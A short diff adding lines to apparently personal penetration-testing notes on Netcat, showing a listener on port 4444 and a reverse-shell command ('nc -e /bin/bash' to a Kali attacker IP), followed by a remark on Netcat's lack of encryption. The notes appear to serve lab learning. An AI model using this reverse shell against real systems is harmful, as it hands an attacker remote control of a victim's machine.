@@ -1,5 +1,17 @@
 # Net Cat:
 
+Listen on a port  4444 using NC:
+```
+nc -nlvp 4444
+```
+
+Control-Z to exit out of the shell.
+
+Connect to NC from a remote box:
+```
+nc -e /bin/bash <KaliBoxIP> <portNumber>
+```
+
 NetCat does not have encryption, therefore packets are send in clear text and firewall can inspect the packets for any malware.
 
 While doing chat (below), run a packet capture:
